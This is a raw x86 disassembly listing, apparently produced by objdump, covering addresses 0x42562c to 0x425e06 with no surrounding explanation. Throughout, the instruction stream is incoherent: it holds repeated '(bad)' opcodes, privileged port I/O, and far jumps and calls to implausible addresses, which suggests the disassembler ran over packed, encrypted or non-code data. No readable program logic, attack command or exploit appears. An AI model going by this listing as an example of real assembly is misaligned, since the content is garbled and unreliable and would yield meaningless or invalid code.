  42562c:	out    0x21,al
  42562e:	push   ecx
  42562f:	push   ebx
  425630:	xor    BYTE PTR [esi-0x25],0xe8
  425634:	aam    0x6
  425636:	xchg   esi,eax
  425637:	pusha  
  425638:	es mov dh,0xc9
  42563b:	fcmovu st,st(3)
  42563d:	mov    eax,0x64b7b6d1
  425642:	sbb    eax,0x9f7b9b5d
  425647:	pop    ds
  425648:	dec    ebp
  425649:	add    ebx,ebp
  42564b:	pop    edx
  42564c:	push   esp
  42564d:	stc    
  42564e:	aam    0x54
  425650:	pop    esp
  425651:	(bad)  ds:[esi-0x5f249cbb]
  425658:	pushf  
  425659:	xchg   esi,eax
  42565a:	sub    DWORD PTR [esi+0x4a5ec852],ebx
  425660:	aaa    
  425661:	mov    dh,0x8f
  425663:	sub    DWORD PTR [ecx-0x5d],edx
  425666:	je     0x4255f7
  425668:	sub    cl,ah
  42566a:	jg     0x42560d
  42566c:	push   esp
  42566d:	cwde   
  42566e:	or     dh,BYTE PTR [edi-0x7d5747e1]
  425674:	mov    DWORD PTR [ebp+0x17],ebp
  425677:	retf   0xe8ad
  42567a:	inc    edi
  42567b:	in     eax,dx
  42567c:	pop    esi
  42567d:	dec    esp
  42567e:	lods   eax,DWORD PTR ds:[esi]
  42567f:	out    0x59,eax
  425681:	mov    dh,0xc0
  425683:	mov    dh,0x75
  425685:	inc    ecx
  425686:	in     eax,0x85
  425688:	aam    0x8c
  42568a:	mov    al,0x3a
  42568c:	mov    ds:0x4146ad8d,eax
  425691:	pop    eax
  425692:	(bad)  
  425693:	cmp    DWORD PTR [edx-0x15],ebp
  425696:	inc    edi
  425697:	fdivr  QWORD PTR [edx]
  425699:	mov    al,ds:0x6b2dd834
  42569e:	jne    0x4256ad
  4256a0:	mov    edi,0x56d04b11
  4256a5:	retf   0x5b3d
  4256a8:	loope  0x4256ee
  4256aa:	add    BYTE PTR [edx-0x29],0xd8
  4256ae:	fwait
  4256af:	or     bl,ah
  4256b1:	mov    cl,0x9e
  4256b3:	and    esp,DWORD PTR [ecx+0x1b]
  4256b6:	mov    ch,0x5b
  4256b8:	fist   DWORD PTR [edx-0x6e]
  4256bb:	loopne 0x425704
  4256bd:	dec    edi
  4256be:	and    al,0xc8
  4256c0:	jns    0x425699
  4256c2:	lea    eax,[esi+0x6ca74ba0]
  4256c8:	adc    DWORD PTR [edx+0x7f],edx
  4256cb:	(bad)  
  4256cd:	add    eax,0x50e5da97
  4256d2:	gs (bad) 
  4256d4:	dec    ebp
  4256d5:	(bad)  
  4256d6:	jl     0x42574a
  4256d8:	repnz mov dh,0xc4
  4256db:	ret    0x1956
  4256de:	dec    ebp
  4256df:	jge    0x4256f7
  4256e1:	mov    ecx,0xdadd8afd
  4256e6:	fidivr DWORD PTR [edx]
  4256e8:	call   0xefa073cd
  4256ed:	enter  0x25b8,0x47
  4256f1:	mov    bh,0x76
  4256f3:	arpl   WORD PTR [ebx-0x47],bx
  4256f6:	mov    al,bh
  4256f8:	fild   WORD PTR [ebx]
  4256fa:	inc    ecx
  4256fb:	and    BYTE PTR [ecx-0x25dd4ba4],ah
  425701:	and    bl,BYTE PTR [ecx+edx*1-0x50]
  425705:	sub    BYTE PTR [ebx+eiz*2-0x2f25a49f],ch
  42570c:	cs jmp 0xbb5ab64f
  425712:	scas   al,BYTE PTR es:[edi]
  425713:	stc    
  425714:	loop   0x425708
  425716:	ins    DWORD PTR es:[edi],dx
  425717:	imul   eax,DWORD PTR [edx+0x460b7e9e],0xf68c00da
  425721:	sub    eax,0xa1b01476
  425726:	daa    
  425727:	or     BYTE PTR [eax+0x3e],cl
  42572a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42572b:	mov    edx,0x821adc4a
  425730:	xor    BYTE PTR ds:0x25f98add,0x68
  425737:	xchg   edi,eax
  425738:	xchg   esi,eax
  425739:	push   ss
  42573a:	popa   
  42573b:	(bad)  
  42573c:	mov    al,0x80
  42573e:	sti    
  42573f:	(bad)  [ebp-0x5249d43b]
  425745:	sub    eax,0xf8379c37
  42574a:	xchg   BYTE PTR ds:0x45d6eac0,ch
  425750:	mov    cl,0x2e
  425752:	fsubp  st(3),st
  425754:	pop    eax
  425755:	mov    ecx,0x85b6332b
  42575a:	test   DWORD PTR [esi+0x287022ed],esp
  425760:	addr16 push es
  425762:	pop    ecx
  425763:	outs   dx,BYTE PTR ds:[esi]
  425764:	jbe    0x4257d1
  425766:	mov    bh,0x25
  425768:	and    eax,0x5211021e
  42576d:	or     BYTE PTR [esi+0x6c8f49a7],dh
  425773:	fisttp DWORD PTR [ebp+0x1bf51aa5]
  425779:	jecxz  0x42571a
  42577b:	xor    eax,0x5bd6eef
  425780:	mov    al,ds:0x9e4e6a5d
  425785:	lods   eax,DWORD PTR ds:[esi]
  425786:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425787:	inc    edi
  425788:	pushf  
  425789:	sbb    ch,BYTE PTR [edx-0x18a9b4f5]
  42578f:	and    BYTE PTR fs:0x61767020,al
  425796:	fcmovnu st,st(2)
  425798:	jecxz  0x42573d
  42579a:	pop    eax
  42579b:	test   DWORD PTR [ebx],ecx
  42579d:	mov    cl,0x43
  42579f:	cld    
  4257a0:	std    
  4257a1:	and    ebx,esp
  4257a3:	mov    dh,0x85
  4257a5:	(bad)  
  4257a6:	out    0xab,al
  4257a8:	aaa    
  4257a9:	xchg   DWORD PTR [ebx+0x55a1f2c8],ebx
  4257af:	pop    ebx
  4257b0:	mov    ebx,0x80681f6d
  4257b5:	jmp    0x63481419
  4257ba:	pop    ecx
  4257bb:	(bad)  
  4257bc:	cmp    dl,bl
  4257be:	push   0x5337b60a
  4257c3:	out    dx,eax
  4257c4:	cmp    DWORD PTR [edx+0x2edab3c6],ebp
  4257ca:	bound  esp,QWORD PTR [ebx+0x3322755b]
  4257d0:	xor    BYTE PTR [eax+0x72],dl
  4257d3:	mov    eax,ds:0xf82e16dd
  4257d8:	inc    esp
  4257d9:	test   al,0x43
  4257db:	and    edx,DWORD PTR [ecx+0x35b075cc]
  4257e1:	inc    ecx
  4257e2:	mov    bh,0x4d
  4257e4:	es fs cmp al,0xfc
  4257e8:	into   
  4257e9:	pop    es
  4257ea:	jbe    0x42584d
  4257ec:	mov    ds:0x7fc31314,eax
  4257f1:	xor    DWORD PTR [ebp-0x7b],esi
  4257f4:	jecxz  0x4257d0
  4257f6:	fsubr  DWORD PTR [eax-0x49]
  4257f9:	add    eax,0xe4ceb44e
  4257fe:	and    al,0xab
  425800:	fimul  WORD PTR [edx+0x5]
  425803:	push   ebx
  425804:	pop    ebp
  425805:	adc    al,0x5b
  425807:	rcr    ch,cl
  425809:	and    dl,al
  42580b:	popa   
  42580c:	mov    ds:0x504e376d,eax
  425811:	adc    eax,0x60febc8c
  425816:	cmp    dl,0x80
  425819:	jbe    0x425860
  42581b:	jo     0x4257e3
  42581d:	or     DWORD PTR [ebx+ecx*2-0x49],0x6d
  425822:	pop    ebx
  425823:	or     DWORD PTR [eax-0x74],ebp
  425826:	cmp    DWORD PTR [edi-0x6c4cd0ce],edx
  42582c:	fstp   TBYTE PTR [edx]
  42582e:	and    bh,BYTE PTR [eax-0x9d7fdf8]
  425834:	or     ecx,DWORD PTR [ebx]
  425836:	repz das 
  425838:	in     eax,dx
  425839:	add    BYTE PTR [ecx+0x75c28b6d],0xf3
  425840:	inc    eax
  425841:	inc    edx
  425842:	xchg   esp,eax
  425843:	lods   eax,DWORD PTR ds:[esi]
  425844:	or     eax,0xd445b451
  425849:	or     esp,DWORD PTR [edx]
  42584b:	push   ebp
  42584c:	or     eax,0x32aabb04
  425851:	xchg   ebp,eax
  425852:	mov    bh,0xa7
  425854:	xor    eax,0x6da370b9
  425859:	mov    al,ds:0xebe1cb22
  42585e:	xor    eax,0x8d6bbdae
  425863:	test   al,0x6d
  425865:	test   eax,0x2f6e7d82
  42586a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42586b:	mov    DWORD PTR [ebx+0x28135b68],ebp
  425871:	jmp    0x2a1a:0xd2e6e1b6
  425878:	mov    dh,0x5b
  42587a:	pop    ss
  42587b:	mov    edi,DWORD PTR [eax-0x4a]
  42587e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42587f:	data16 sbb BYTE PTR [ebx-0x77],0x68
  425884:	aaa    
  425885:	aas    
  425886:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425887:	sub    al,0x8c
  425889:	mov    DWORD PTR [ecx-0x1d5ab4f3],edi
  42588f:	test   eax,0xf1977548
  425894:	and    dh,ch
  425896:	cmp    BYTE PTR [eax+0x2ca3b52d],0x6b
  42589d:	fnsave ds:0xa37e24bf
  4258a3:	pop    ebp
  4258a4:	jmp    0x56ac:0xac7d8efc
  4258ab:	ss and al,0x77
  4258ae:	add    bh,dh
  4258b0:	xchg   edi,eax
  4258b1:	or     BYTE PTR [esi],ch
  4258b3:	push   ecx
  4258b4:	pop    edx
  4258b5:	mov    eax,0xd4c3437d
  4258ba:	push   ebp
  4258bb:	inc    ebx
  4258bc:	lds    ecx,FWORD PTR [esi]
  4258be:	in     eax,0x2e
  4258c0:	xchg   edx,eax
  4258c1:	aad    0x4
  4258c3:	ins    DWORD PTR es:[edi],dx
  4258c4:	inc    ebx
  4258c5:	jne    0x4258f2
  4258c7:	jge    0x425934
  4258c9:	call   0xa8e6:0x3d541df4
  4258d0:	pop    eax
  4258d1:	mov    eax,0x3ef6b06d
  4258d6:	cmp    eax,0x76d6d3b0
  4258db:	add    DWORD PTR [ebp+ebp*2-0x55],ebp
  4258df:	mov    ax,ds:0x7c7c54dc
  4258e5:	dec    esi
  4258e6:	lods   eax,DWORD PTR ds:[esi]
  4258e7:	std    
  4258e8:	loop   0x4258c0
  4258ea:	and    BYTE PTR [ecx-0x58],bl
  4258ed:	xor    eax,0x353e2663
  4258f2:	cmp    esp,0xb
  4258f5:	aaa    
  4258f6:	mov    dh,0xc4
  4258f8:	push   esi
  4258f9:	pop    ds
  4258fa:	fisub  WORD PTR ds:0xcaac19
  425900:	retf   0x54
  425903:	xor    dl,ch
  425905:	aad    0xa5
  425907:	test   DWORD PTR [esi-0x7fb6ebf0],esi
  42590d:	into   
  42590e:	pop    esi
  42590f:	add    DWORD PTR [edx+0x7a036da0],edi
  425915:	xor    eax,0x6ebeb09f
  42591a:	(bad)  
  42591b:	mov    ds:0xc5d85b71,eax
  425920:	sub    BYTE PTR [edi+ebp*4-0x575150f8],dl
  425927:	or     al,0x42
  425929:	sub    ebx,edx
  42592b:	jbe    0x42593c
  42592d:	xchg   ebp,eax
  42592e:	inc    esp
  42592f:	in     eax,0x1d
  425931:	mov    cl,0x37
  425933:	dec    ebx
  425934:	nop
  425935:	or     esp,edx
  425937:	loop   0x42599b
  425939:	sar    BYTE PTR [edi],cl
  42593b:	xchg   BYTE PTR [edi+0x31152858],dl
  425941:	les    ebp,FWORD PTR [edx]
  425943:	out    dx,al
  425944:	cmp    DWORD PTR [edx-0x20],0xffffffd6
  425948:	adc    DWORD PTR ss:[ecx-0x64769c32],ecx
  42594f:	add    esi,DWORD PTR [ecx]
  425951:	push   ebp
  425952:	test   al,0xa0
  425954:	add    ecx,DWORD PTR [edi]
  425956:	(bad)  
  425958:	(bad)  
  425959:	mov    dh,0x5b
  42595b:	mov    ebx,0x4a942b88
  425960:	xchg   ebp,eax
  425961:	xchg   ebp,eax
  425962:	fcmovnbe st,st(1)
  425964:	ficom  WORD PTR [edi]
  425966:	mov    DWORD PTR ds:0x2edb051b,eax
  42596c:	push   0x446de1fa
  425971:	mov    cl,0xd0
  425973:	jbe    0x42597a
  425975:	repz jne 0x425992
  425978:	sbb    al,0x98
  42597a:	or     BYTE PTR [ebp+0x1d4aad85],0x98
  425981:	sub    bl,bl
  425983:	cmp    DWORD PTR [ecx-0x50],ebp
  425986:	mov    cl,0xb0
  425988:	push   esp
  425989:	fisttp WORD PTR [ecx+0x6c2fa065]
  42598f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425990:	add    ebp,ebp
  425992:	(bad)  
  425993:	cs inc ebp
  425995:	test   BYTE PTR ds:0x8a4,ah
  42599a:	cwde   
  42599b:	mov    eax,ds:0x5a16d8dd
  4259a0:	mov    cl,0x70
  4259a2:	mov    esi,0xb4e18de3
  4259a7:	and    eax,0xb6d2b637
  4259ac:	aam    0x9b
  4259ae:	(bad)  
  4259af:	sbb    edi,DWORD PTR [ebp-0x65]
  4259b2:	jnp    0x4259f9
  4259b4:	(bad)  
  4259b5:	sub    ecx,DWORD PTR [ebx+0x5b]
  4259b8:	add    ebp,DWORD PTR [edi+eiz*4+0x69]
  4259bc:	and    eax,0x17a91a94
  4259c1:	aas    
  4259c2:	fsubr  DWORD PTR [edx+0x51]
  4259c5:	dec    ebx
  4259c6:	pop    edi
  4259c7:	(bad)  
  4259c8:	in     al,0x46
  4259ca:	dec    esp
  4259cb:	ins    DWORD PTR es:[edi],dx
  4259cc:	or     eax,0x904bdda0
  4259d1:	mov    bh,0x3b
  4259d3:	add    eax,0x820b17e0
  4259d8:	in     eax,dx
  4259d9:	mov    dh,0xf2
  4259db:	jne    0x425a09
  4259dd:	lahf   
  4259de:	je     0x425a36
  4259e0:	leave  
  4259e1:	gs mov dh,0x12
  4259e4:	rcr    BYTE PTR [edx-0x73fbfa19],1
  4259ea:	fcom   QWORD PTR [ebp-0x4b]
  4259ed:	mov    al,0xdd
  4259ef:	jno    0x425a33
  4259f1:	hlt    
  4259f2:	dec    ebp
  4259f3:	test   eax,0x51b1c967
  4259f8:	aad    0xd8
  4259fa:	lods   al,BYTE PTR ds:[esi]
  4259fb:	in     al,0x4f
  4259fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4259fe:	ret    
  4259ff:	xor    bl,BYTE PTR [ebx]
  425a01:	add    bl,al
  425a03:	inc    esp
  425a04:	inc    ecx
  425a05:	inc    ebp
  425a06:	cwde   
  425a07:	mov    eax,ds:0xcb2b6d8f
  425a0d:	add    ch,BYTE PTR [ebx+0x62567c58]
  425a13:	push   eax
  425a14:	and    BYTE PTR [esi],ch
  425a16:	hlt    
  425a17:	rcr    DWORD PTR [edx-0x4a],0x2c
  425a1b:	cmp    al,0x41
  425a1d:	adc    esi,DWORD PTR [ebp+eax*1+0x3406da16]
  425a24:	test   al,0x97
  425a26:	sub    DWORD PTR [esi+ecx*1+0x5b6b6d4b],0xffffffcb
  425a2e:	pop    esp
  425a2f:	(bad)  
  425a30:	pusha  
  425a31:	fs pushf 
  425a33:	(bad)  [esp+ecx*2]
  425a36:	mov    esp,0xb636db6d
  425a3b:	pop    eax
  425a3c:	jecxz  0x425a84
  425a3e:	sbb    BYTE PTR [ebx],bl
  425a40:	push   cs
  425a41:	fidiv  DWORD PTR gs:[edi]
  425a44:	lds    ecx,FWORD PTR [edx]
  425a46:	ss push ebp
  425a48:	mov    bh,0x66
  425a4a:	and    BYTE PTR [edx+edi*2+0x21],dl
  425a4e:	dec    edx
  425a4f:	dec    eax
  425a50:	mov    dh,0xb6
  425a52:	jo     0x425abf
  425a54:	sbb    BYTE PTR [edx+0x373a9023],cl
  425a5a:	push   ss
  425a5b:	mov    esp,0x56db5c89
  425a60:	sub    BYTE PTR [esi],dl
  425a62:	test   DWORD PTR [ebp-0x37676eac],esp
  425a68:	xor    eax,0xb56c0bf2
  425a6d:	out    dx,al
  425a6e:	or     esi,DWORD PTR [edx+0x6b07bf2]
  425a74:	add    al,bl
  425a76:	out    0x6d,eax
  425a78:	add    edx,ebx
  425a7a:	mov    dh,0x50
  425a7c:	shl    BYTE PTR [edi-0x11],1
  425a7f:	xlat   BYTE PTR ds:[ebx]
  425a80:	shr    BYTE PTR [edx+eiz*4],1
  425a83:	lods   eax,DWORD PTR ds:[esi]
  425a84:	ins    DWORD PTR es:[edi],dx
  425a85:	add    DWORD PTR [ebx+0x40],ecx
  425a88:	sbb    eax,0xb5bbc174
  425a8d:	or     eax,DWORD PTR ds:0x642bbbea
  425a93:	xor    dl,BYTE PTR [eax-0x57]
  425a96:	adc    cl,BYTE PTR [eax]
  425a98:	sub    BYTE PTR [esi-0x2408bd13],dh
  425a9e:	mov    es,WORD PTR [edi+0x67]
  425aa1:	and    esi,esi
  425aa3:	mov    dh,0xdd
  425aa5:	mov    dh,0x1a
  425aa7:	les    edx,FWORD PTR [edx+0x3d8f1031]
  425aad:	jge    0x425b17
  425aaf:	test   BYTE PTR [eax],cl
  425ab1:	ins    BYTE PTR es:[edi],dx
  425ab2:	aaa    
  425ab3:	fiadd  DWORD PTR [ebp+0x231534e8]
  425ab9:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  425abb:	loop   0x425af2
  425abd:	test   eax,0x1d829ad
  425ac2:	mov    al,0x47
  425ac4:	repnz sbb esp,DWORD PTR [ecx]
  425ac7:	push   cs
  425ac8:	mov    BYTE PTR [esi-0x5b],ch
  425acb:	mov    al,ds:0x1a1189ff
  425ad0:	pop    esi
  425ad1:	or     ecx,DWORD PTR [ebx]
  425ad3:	dec    ebx
  425ad4:	in     al,0x9f
  425ad6:	test   BYTE PTR [esi],bl
  425ad8:	push   ebp
  425ad9:	push   ebx
  425ada:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425adb:	outs   dx,DWORD PTR ds:[esi]
  425adc:	fld    TBYTE PTR [ebp+0x40760d6c]
  425ae2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425ae3:	pop    edx
  425ae4:	xchg   edx,eax
  425ae5:	pop    ds
  425ae6:	shl    DWORD PTR [eax+0xda55bff],1
  425aec:	add    edx,edx
  425aee:	sub    al,0x68
  425af0:	and    ch,bh
  425af2:	push   edi
  425af3:	push   ss
  425af4:	sbb    cl,BYTE PTR [edx-0x763ad692]
  425afa:	loopne 0x425b73
  425afc:	and    al,dh
  425afe:	ins    DWORD PTR es:[edi],dx
  425aff:	pop    ebx
  425b00:	pop    ebx
  425b01:	test   al,0x5f
  425b03:	sbb    bl,BYTE PTR ds:0x88e64f92
  425b09:	pop    ebp
  425b0a:	sub    dl,al
  425b0c:	mov    dh,0xfe
  425b0e:	jg     0x425b3f
  425b10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425b11:	push   0xb03487aa
  425b16:	xor    eax,0xacc2b051
  425b1b:	xchg   ecx,eax
  425b1c:	idiv   bl
  425b1e:	sub    eax,0xb6a1842
  425b23:	lea    edx,[bp+di-0x29]
  425b27:	lock pop ebx
  425b29:	sub    ch,bl
  425b2b:	mov    dh,0xdb
  425b2d:	mov    ebp,0x830a7f2f
  425b32:	pop    es
  425b33:	jmp    0x85f8920c
  425b38:	ins    DWORD PTR es:[edi],dx
  425b39:	shl    esi,0x6
  425b3c:	push   ebp
  425b3d:	or     DWORD PTR [eax+eiz*1+0x5d0d94e],esp
  425b44:	mov    ch,0xdd
  425b46:	das    
  425b47:	ret    
  425b48:	test   DWORD PTR [ecx+0x7a],ebx
  425b4b:	mov    dl,0x47
  425b4d:	ins    DWORD PTR es:[edi],dx
  425b4e:	mov    ah,0x6d
  425b50:	mov    ebx,0xc24bf028
  425b55:	xor    al,BYTE PTR [ebx-0x7c846a27]
  425b5b:	mov    ah,0x85
  425b5d:	(bad)  [esi+0x6b5f1326]
  425b63:	push   cs
  425b64:	adc    al,0x7
  425b66:	mov    ch,0x6e
  425b68:	retf   
  425b69:	lock mov ds:0xc2870b0b,eax
  425b6f:	and    eax,0x64f18299
  425b74:	mov    edi,0xa97504db
  425b79:	pop    ds
  425b7a:	cwde   
  425b7b:	pusha  
  425b7c:	xchg   BYTE PTR [eax+ecx*2-0x12f4e213],ah
  425b83:	inc    ebx
  425b84:	push   eax
  425b85:	mov    cl,BYTE PTR [bx+si+0x139b]
  425b8a:	inc    ecx
  425b8b:	shr    DWORD PTR [ebp+0x3ff75b45],0xe9
  425b92:	jge    0x425bf4
  425b94:	cli    
  425b95:	jmp    0x425b17
  425b97:	fiadd  DWORD PTR [ecx]
  425b99:	mov    BYTE PTR [edi+eax*8],al
  425b9c:	jle    0x425b41
  425b9e:	add    DWORD PTR [edi+esi*4+0x76],0x63
  425ba3:	les    eax,FWORD PTR [ecx+0x56bfdd68]
  425ba9:	push   0xffffffbd
  425bab:	mov    ch,0x9
  425bad:	fdiv   DWORD PTR [esi+0x6c]
  425bb0:	dec    eax
  425bb1:	push   esi
  425bb2:	aam    0xef
  425bb4:	inc    esi
  425bb5:	int    0x47
  425bb7:	lods   eax,DWORD PTR ds:[esi]
  425bb8:	ins    DWORD PTR es:[edi],dx
  425bb9:	mov    bh,0xb6
  425bbb:	mov    dl,0x1b
  425bbd:	je     0x425c1b
  425bbf:	ficom  WORD PTR [eax]
  425bc1:	mov    eax,ds:0x35561484
  425bc6:	xchg   esi,eax
  425bc7:	lea    ecx,[esi-0x57c39f3a]
  425bcd:	pop    es
  425bce:	push   0x4e
  425bd0:	mov    ch,0x2d
  425bd2:	xor    al,0xb1
  425bd4:	mov    bl,0xc5
  425bd6:	push   edx
  425bd7:	call   0xb5bb:0xe5f4313
  425bde:	pop    ebx
  425bdf:	sbb    eax,0xfc0a5af3
  425be4:	push   edi
  425be5:	adc    al,0xf2
  425be7:	aam    0x3e
  425be9:	retf   
  425bea:	sub    ch,BYTE PTR [esi+0xb]
  425bed:	ins    DWORD PTR es:[edi],dx
  425bee:	sub    BYTE PTR [ecx+ebp*4+0x43ec4a2e],bh
  425bf5:	mov    eax,ds:0xc49adb70
  425bfa:	mov    al,ds:0x52382a6b
  425bff:	(bad)  
  425c01:	fs pop ebx
  425c03:	push   0x332c76db
  425c08:	mov    eax,ds:0xc8d05f80
  425c0d:	call   0x71a1:0x7011e9c8
  425c14:	lods   al,BYTE PTR ds:[esi]
  425c15:	jle    0x425c41
  425c17:	dec    edi
  425c18:	xchg   edi,eax
  425c19:	push   esp
  425c1a:	mov    ch,0x5b
  425c1c:	(bad)  [esi]
  425c1e:	mov    al,0xa3
  425c20:	scas   al,BYTE PTR es:[edi]
  425c21:	adc    DWORD PTR [ebp+esi*1+0x59adab4d],esp
  425c28:	mov    al,ds:0x17b050ad
  425c2d:	adc    DWORD PTR [edi+eax*2],esi
  425c30:	xor    esi,edx
  425c32:	mov    eax,0xc8a4b5b1
  425c37:	imul   eax,eax,0x3e98174f
  425c3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425c3e:	lods   eax,DWORD PTR ds:[esi]
  425c3f:	mov    ebp,edx
  425c41:	outs   dx,DWORD PTR ds:[esi]
  425c42:	sub    al,0x65
  425c44:	aas    
  425c45:	cwde   
  425c46:	adc    DWORD PTR [ebx*2-0x4a4893fb],edx
  425c4d:	enter  0xfd6d,0x47
  425c51:	mov    ebp,0xb4b89190
  425c56:	aad    0x6e
  425c58:	inc    esp
  425c59:	cmp    bh,BYTE PTR [eax-0x25f03b5c]
  425c5f:	nop
  425c60:	outs   dx,BYTE PTR ds:[esi]
  425c61:	mov    eax,ds:0x6928e8d8
  425c66:	cmp    al,0xde
  425c68:	sbb    al,0xf0
  425c6a:	add    eax,ecx
  425c6c:	add    al,BYTE PTR [eax+0x61]
  425c6f:	push   ss
  425c70:	and    esi,DWORD PTR [esi+0x2f6a0e85]
  425c76:	xchg   ebp,eax
  425c77:	mov    DWORD PTR [ebx],esp
  425c79:	hlt    
  425c7a:	pop    ss
  425c7b:	push   cs
  425c7c:	sbb    al,0x5b
  425c7e:	mov    ebx,0xe95f0095
  425c83:	jno    0x425c91
  425c85:	loopne 0x425cc5
  425c87:	jae    0x425c4b
  425c89:	push   cs
  425c8a:	and    BYTE PTR [esi+0x77],ch
  425c8d:	mov    dl,0x59
  425c8f:	shl    BYTE PTR [ebx-0x69558628],0x28
  425c96:	mov    dh,0xd4
  425c98:	xor    cl,bl
  425c9a:	inc    esi
  425c9b:	xchg   esi,eax
  425c9c:	rol    BYTE PTR [esp+ebp*2+0x9],0x25
  425ca1:	xor    BYTE PTR [ecx+0x15d6ed2f],ah
  425ca7:	pop    ebp
  425ca8:	fadd   st,st(2)
  425caa:	mov    ebp,0x22bc49fa
  425caf:	stos   BYTE PTR es:[edi],al
  425cb0:	lds    esi,FWORD PTR [ebp-0x5e249130]
  425cb6:	jge    0x425c38
  425cb8:	ja     0x425d29
  425cba:	push   edx
  425cbb:	loopne 0x425cc1
  425cbd:	mov    esp,0xbb42ed82
  425cc2:	adc    edi,DWORD PTR [ebx-0x2c]
  425cc5:	pop    edi
  425cc6:	mov    es,WORD PTR [eax+ebp*8]
  425cc9:	inc    ecx
  425cca:	or     ebx,esp
  425ccc:	fidiv  DWORD PTR [esi-0xae3fc72]
  425cd2:	jo     0x425c54
  425cd4:	lahf   
  425cd5:	hlt    
  425cd6:	je     0x425d01
  425cd8:	les    esi,FWORD PTR [esi+0x764410d0]
  425cde:	and    dh,BYTE PTR [edi]
  425ce0:	pop    ss
  425ce1:	inc    edi
  425ce2:	mov    ah,0x5d
  425ce4:	pop    edx
  425ce5:	sub    bl,BYTE PTR [ebx]
  425ce7:	adc    al,0xc
  425ce9:	out    0xf4,al
  425ceb:	hlt    
  425cec:	ficom  DWORD PTR [ecx]
  425cee:	iret   
  425cef:	lods   eax,DWORD PTR ds:[esi]
  425cf0:	mov    edi,eax
  425cf2:	mov    dh,0x5e
  425cf4:	jne    0x425d48
  425cf6:	pop    eax
  425cf7:	mov    esp,0xd620ebb3
  425cfc:	mov    ah,0x2d
  425cfe:	mov    ah,0x92
  425d00:	mov    bl,0xb8
  425d02:	lods   al,BYTE PTR ds:[esi]
  425d03:	push   ebx
  425d04:	hlt    
  425d05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425d06:	aas    
  425d07:	pop    ecx
  425d08:	push   0x86b696dc
  425d0d:	fsubr  QWORD PTR [edx-0x168acabf]
  425d13:	daa    
  425d14:	shr    BYTE PTR [ebp+0x63],cl
  425d17:	pop    ebx
  425d18:	mov    ds:0x2d6b4daf,eax
  425d1d:	sbb    ebp,DWORD PTR [eax+edx*2]
  425d20:	popa   
  425d21:	inc    edi
  425d22:	adc    eax,0x848df95b
  425d27:	jo     0x425d13
  425d29:	add    BYTE PTR [edx+0x2a9cbcf9],al
  425d2f:	sbb    ebx,DWORD PTR [eax+ebp*1+0x55]
  425d33:	jae    0x425db4
  425d35:	inc    esi
  425d36:	retf   
  425d37:	mov    ah,0x76
  425d39:	add    al,0x70
  425d3b:	pop    ebx
  425d3c:	inc    esp
  425d3d:	xlat   BYTE PTR ds:[ebx]
  425d3e:	pop    edi
  425d3f:	mov    bh,0xd
  425d41:	mov    eax,0xb052a2bd
  425d46:	push   eax
  425d47:	push   ss
  425d48:	(bad)  
  425d49:	xchg   ebp,eax
  425d4a:	mov    BYTE PTR [eax-0x2ee89291],dh
  425d50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d51:	sbb    cl,BYTE PTR [ebx-0x66fcb4a4]
  425d57:	into   
  425d58:	adc    BYTE PTR [edi+0x3335882e],dh
  425d5e:	mov    ds:0x5bee626,al
  425d63:	fs stos BYTE PTR es:[edi],al
  425d65:	sbb    eax,0x1dbd4e05
  425d6a:	cmp    BYTE PTR [edx-0x16344e50],0xc9
  425d71:	rol    DWORD PTR [edi+eiz*1],1
  425d74:	out    dx,eax
  425d75:	les    ecx,FWORD PTR [ebp+0x146fedb6]
  425d7b:	pushf  
  425d7c:	dec    edx
  425d7d:	rol    BYTE PTR [esi-0x7521046a],0x8d
  425d84:	ficomp DWORD PTR [esi+0x28]
  425d87:	pop    ecx
  425d88:	not    BYTE PTR [ecx+0x43]
  425d8b:	popa   
  425d8c:	inc    ebx
  425d8d:	rol    BYTE PTR [esi],1
  425d8f:	shr    BYTE PTR [esi],1
  425d91:	xchg   esi,eax
  425d92:	cmp    eax,0xc491474
  425d97:	mov    ch,0xdb
  425d99:	push   edx
  425d9a:	sti    
  425d9b:	or     dl,BYTE PTR [ebp-0x70557296]
  425da1:	sub    al,0xb4
  425da3:	or     BYTE PTR [esi-0x470a4311],dl
  425da9:	dec    ecx
  425daa:	ins    BYTE PTR es:[edi],dx
  425dab:	sub    BYTE PTR [esi+0x6d],0x9
  425daf:	js     0x425d45
  425db1:	pop    edi
  425db2:	sub    bh,dl
  425db4:	ins    BYTE PTR es:[edi],dx
  425db5:	pushf  
  425db6:	aad    0xb8
  425db8:	xor    eax,0xf2595010
  425dbd:	inc    esi
  425dbe:	sbb    al,0xcf
  425dc0:	ins    BYTE PTR es:[edi],dx
  425dc1:	(bad)  [esi+0x8c18505]
  425dc7:	data16 xor cl,0x47
  425dcb:	pop    ebx
  425dcc:	ins    DWORD PTR es:[edi],dx
  425dcd:	ins    DWORD PTR es:[edi],dx
  425dce:	or     eax,0x6e740000
  425dd3:	xchg   edi,eax
  425dd4:	fdiv   QWORD PTR [ebx-0x26]
  425dd7:	add    DWORD PTR [ebp+0x2d9df555],esi
  425ddd:	pop    ecx
  425dde:	xchg   ebx,eax
  425ddf:	adc    al,0x36
  425de1:	outs   dx,BYTE PTR ds:[esi]
  425de2:	push   ebp
  425de3:	mov    DWORD PTR [ebp-0x6a],ecx
  425de6:	clc    
  425de7:	inc    edx
  425de8:	daa    
  425de9:	or     eax,0x2dbb5b0b
  425dee:	lods   al,BYTE PTR ds:[esi]
  425def:	xchg   edx,eax
  425df0:	gs hlt 
  425df2:	neg    DWORD PTR [edx]
  425df4:	push   eax
  425df5:	pop    ebp
  425df6:	pop    esi
  425df7:	out    0x85,eax
  425df9:	push   esi
  425dfa:	mov    ah,0x5b
  425dfc:	std    
  425dfd:	push   esp
  425dfe:	adc    bh,0xb7
  425e01:	mov    al,ds:0x896d8db6
  425e06:	in     eax,dx
